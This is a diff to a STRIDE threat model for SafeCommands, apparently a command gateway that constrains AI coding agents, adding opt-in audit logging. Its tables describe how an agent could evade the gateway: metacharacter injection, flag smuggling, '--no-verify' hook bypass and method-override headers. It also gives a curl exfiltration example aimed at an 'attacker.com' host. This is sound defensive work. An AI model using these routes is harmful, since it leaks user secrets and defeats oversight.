@@ -53,6 +53,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 2. **SafeCommands → External Tools**: Commands forwarded via the `IExecutor` port (`ProcessExecutor` → `ProcessRunner`) with `ArgumentList` (no shell interpretation). Flag filtering applied per command.
 3. **SafeCommands → File System**: File I/O via the `IWorkspace` port for file commands. Path containment enforced by declared policy rules.
 4. **GitHub Actions → NuGet.org**: OIDC trusted publishing, no stored API keys.
+5. **SafeCommands → Per-user audit storage**: `CommandAudit` wraps outer CLI routing. An opt-in config enables `JsonlAuditStore` outside the project workspace; this separate storage port never changes command safety policy.
 
 ### Data Classification
 
@@ -63,6 +64,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 | Environment variables | Potentially sensitive | Secret patterns masked in `env vars` |
 | File contents | Varies | Read/write operations with safety checks |
 | Git repository data | Developer work product | Protected by clean-tree checks, tracked-file checks |
+| Audit records | Local identity/path metadata | Opt-in; no argument values or output; private permissions and three-file bounded retention |
 
 ## STRIDE Analysis
 
@@ -88,7 +90,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 | T1 | Argument injection via shell metacharacters | Agent passes args containing `;`, `&&`, `|`, `` ` `` to execute arbitrary commands | 1 | 4 | 4 | ASVS V1 Encoding/Sanitization | **Fully mitigated.** `ProcessRunner` uses `ProcessStartInfo.ArgumentList` (not shell execution). Each argument is passed as a discrete parameter - no shell interpretation occurs. |
 | T2 | Flag smuggling past allowlist | Agent passes `--force` as part of a combined flag like `--force-with-lease` or via `--force=true` | 2 | 3 | 6 | ASVS V2 Validation | Flag checks use `HashSet.Contains()` on individual args. `--force-with-lease` is intentionally allowed on push. Combined flag forms like `--force=true` are not matched (would need `=` splitting). |
 | T3 | Git hook bypass | Agent passes `--no-verify` or `-n` to skip pre-commit hooks | 1 | 3 | 3 | ASVS V2 Validation | **Fully mitigated.** `git commit` carries a declared `BlockFlags(["--no-verify", "-n"])` policy evaluated at the `CommandDispatcher` seam; `--no-verify` is also in `PushBlockedFlags` for push. |
-| T4 | Config file tampering | Attacker modifies `~/.safecommands/config.json` to add malicious commands | 2 | 3 | 6 | ASVS V13 Configuration | Extension config not yet implemented (the `Configuration/` directory is empty). When added, should use SHA-256 trust verification (like P:\Dev pattern). |
+| T4 | Config file tampering | Attacker modifies `~/.safecommands/config.json` to change behavior or disable history | 2 | 2 | 4 | ASVS V13 Configuration | **Partially mitigated.** Only boolean `audit` is read; unrelated properties cannot change the compiled allowlist or safety policy. Malformed/unreadable config disables audit with a fixed stderr diagnostic. The same user can disable or tamper with history; it is not a trusted ledger. |
 | T5 | Destructive HTTP method via `gh api` proxy | Agent runs `safe proxy gh api -X DELETE repos/o/r` (or `PUT`/`PATCH`), or smuggles a method-override header like `-H "X-HTTP-Method-Override: DELETE"`, to delete or overwrite GitHub resources through the gateway | 1 | 4 | 4 | ASVS V2 Validation / V4 API | **Fully mitigated.** `gh api`'s flag allowlist permits field (`-f`/`-F`), output (`-q`/`--jq`), and pagination flags but omits `-X`/`--method` **and** `-H`/`--header`. `gh api` auto-selects GET (no fields) or POST (with fields), so with the method override blocked, writes are confined to POST-via-fields (resource creation). Excluding `-H` keeps that boundary structural rather than dependent on the remote server declining a method-override header; DELETE/PUT/PATCH cannot be expressed. |
 
 **Countermeasures:**
@@ -100,11 +102,11 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 
 | ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
 |----|--------|-------------|------------|--------|-------|---------|------------|
-| R1 | No audit trail of commands executed | Agent runs destructive commands (even allowed ones) with no record of what was executed, when, or by whom | 3 | 3 | **9** | ASVS V16 Security Logging (absent) | **Unmitigated.** No logging infrastructure exists. See [#1](https://github.com/hansen-consultancy/SafeCommands/issues/1). |
+| R1 | Incomplete audit trail of commands executed | Agent runs destructive commands (even allowed ones) without durable authenticated evidence | 3 | 3 | **9** | ASVS V16 Security Logging / OS local storage | **Partially mitigated; residual score unchanged.** Opt-in `CommandAudit` records one completion per outer invocation, including failure/help routes, without duplicating recursive proxy dispatch. Canonical command, timing, OS user/cwd/PID and exit outcome aid investigation. Audit is fail-open, completion-only, bounded and user-editable; omitted arguments limit reconstruction and OS identity does not authenticate an agent. Forced termination and storage failures can leave no record. See [#1](https://github.com/hansen-consultancy/SafeCommands/issues/1). |
 | R2 | JSON output lacks provenance | `--json` output doesn't include timestamp, tool version, or execution context | 2 | 2 | 4 | ASVS V16 Security Logging | Low priority. Callers can add their own metadata. |
 
 **Countermeasures:**
-- **R1 is a high-priority gap.** Recommend adding optional audit logging in a future release.
+- **R1 remains a high-priority residual risk.** Optional local completion history helps investigation; authenticated durable evidence would require a stronger destination and lifecycle contract.
 - Git operations leave their own audit trail via git reflog
 
 ### I - Information Disclosure
@@ -117,6 +119,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 | I4 | Data exfiltration via curl URL | Agent calls `safe proxy curl https://attacker.com?secret=value` to send data via GET URL parameters | 2 | 3 | 6 | Network egress control (infra) — none | **Partially mitigated.** POST/PUT/DELETE blocked (`CurlWriteFlags` blocked up front: `-X`, `-d`, `-F`, `--upload-file`, `-T`), but GET with query params can exfiltrate data. URL validation not implemented. |
 | I5 | Generated secrets exposed in agent context | Agent calls `safe generate secret` or `safe generate password` and the value appears in chat/logs. Secrets never reach a secure store — they exist only in stdout. | 3 | 2 | 6 | ASVS V14 Data Protection — accepted | **Accepted by design.** The agent explicitly requested the value for use in config scaffolding, test fixtures, etc. Users should rotate any generated secret used in production. |
 | I6 | JWT payload disclosure via jwt-decode | Agent decodes a JWT containing PII or sensitive claims, exposing the payload in chat context | 2 | 2 | 4 | ASVS V14 Data Protection — accepted | **Accepted by design.** Agent explicitly requested decode. No signature verification is performed — this is inspection, not authentication. |
+| I7 | Audit metadata disclosure | Another local user reads retained command identities, working directories or usernames | 2 | 2 | 4 | ASVS V14 Data Protection / OS file permissions | **Partially mitigated.** Auditing requires opt-in. No arbitrary arguments, unknown tokens, output, exception messages or policy reasons are persisted. New storage has user-private permissions; existing grants are restricted without broadening access where supported. Three 10 MiB files bound retention. Paths/usernames still disclose local information; same-user access remains by design. |
 
 **Countermeasures:**
 - I1: Expand secret patterns or switch to allowlist approach for env vars
@@ -131,6 +134,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 | D1 | Resource exhaustion via large file operations | Agent calls `safe file delete-pattern *.* --in node_modules` on a monorepo with millions of files | 2 | 2 | 4 | App-level resource caps (ASVS thin on DoS) | Partially mitigated: `file find` caps at 500 results, `file tree` defaults to depth 3. Delete operations have no file count limit. |
 | D2 | Process timeout | Spawned process hangs indefinitely (e.g., `safe dotnet run` starts a web server) | 2 | 1 | 2 | OS process control (infra) | **Accepted risk.** Long-running processes are expected for `run`, `watch`, `serve`. Agent or user can Ctrl+C. |
 | D3 | Docker log output size | `safe docker logs <container>` captures all logs into memory | 2 | 2 | 4 | App-level resource caps | `-f`/`--follow` stripped to prevent infinite streaming. Large historical logs could exhaust memory. |
+| D4 | Audit storage delays or exhaustion | Concurrent invocations contend for storage, fill disks, or encounter stalled filesystem operations | 2 | 2 | 4 | App-level resource caps / OS local storage | **Partially mitigated.** Three files of at most 10 MiB, oversized-record rejection, and a persistent exclusive lock with 250 ms acquisition budget. Lock covers recovery/rotation/append only. Failures warn once on stderr and preserve command outcome; individual filesystem operations remain unbounded. Partial rotation stops without rollback; a partial trailing line is truncated on the next append. |
 
 **Countermeasures:**
 - Future: add configurable timeouts to ProcessRunner
@@ -157,7 +161,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 
 | ID | Threat | Score | Status |
 |----|--------|-------|--------|
-| R1 | No audit trail of commands executed | 9 | Unmitigated - recommend audit logging |
+| R1 | Incomplete audit trail of commands executed | 9 | **Partially mitigated** - opt-in local completion history; no durable authenticated guarantee |
 | I1 | Environment variable secret exposure via incomplete blocklist | 9 | **Mitigated** - switched to allowlist (safe vars only by default, expanded masking with `--all`) |
 | E1 | File write outside project directory | 8 | **Mitigated** - declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule` evaluated centrally at the `CommandDispatcher` seam |
 
@@ -190,6 +194,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 | **Secret Masking** | Environment variable secret pattern matching (blocklist) |
 | **CI/CD Security** | OIDC trusted publishing, no stored API keys, tag-triggered only |
 | **Output Modes** | `--json` for machine-readable output, human-readable with safety colors |
+| **Audit History** | Opt-in metadata-only JSONL at the outer CLI boundary; private local storage, bounded retention, cross-process locking, fail-open diagnostics; partial R1 mitigation |
 
 ## Review History
 
@@ -202,6 +207,7 @@ All commands flow through a single dispatch seam: `Program.cs` (composition root
 | v5 | 2026-06-13 | STRIDE update (gh api flags) | Added T5. `gh api`'s previously empty flag allowlist (which blocked every flag, leaving only bare GET usable) now permits field/output/pagination flags for read and POST-via-fields create. `-X`/`--method` and `-H`/`--header` remain excluded, so DELETE/PUT/PATCH cannot be expressed through the gateway — neither directly nor via a method-override header. |
 | v6 | 2026-06-20 | STRIDE update (arg-parsing unification) | Candidate 4 consolidated per-handler arg parsing into the shared case-insensitive `Sugar/Args` helper. This created a handler↔policy case-agreement requirement for the path flags behind E1/I2: a handler must read the *same* token the policy checks. `Safety/PathArg.FlagValue` was therefore flipped from ordinal to case-insensitive matching in lockstep, so a flag like `--IN` that a handler honors cannot slip a path past `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule`. Net-safer (matches a superset of before; containment still enforced); regression-tested via `file delete-pattern --IN`. No new threats — strengthens the existing E1/I2 mitigation. |
 | v7 | 2026-07-04 | STRIDE update (Candidate 3 verification + control backfill) | Re-verified all mitigations after the Candidate 3 Ports refactor (all groups migrated onto `Ports`, `Program.cs` extracted into testable `Cli`, `OutputFormatter` deleted, new `IProcessHost` port): T1/T3/T5/E1/E2/E3/I1/I2/I4 all hold; dispatch remains a single policy seam with no bypass. Updated System Overview to the Cli + Ports/Adapters architecture; count corrected to 161 commands. T3 mitigation text updated (now a declared `BlockFlags` policy, no longer handler-inline). Added E5: `kill-port` kills the listening port-holder without the dev-tool name allowlist (accepted with recommendation). Backfilled the Control (ASVS/infra) column for all threats per the control-citation guidance. |
+| v8 | 2026-09-13 | STRIDE update (audit history) | Partially mitigated R1 with opt-in metadata-only completion history; retained residual score 9. Updated T4 for audit-only config, added I7 local metadata disclosure and D4 storage availability, and documented the per-user storage boundary and retention/privacy controls. |
 
 ## References
 
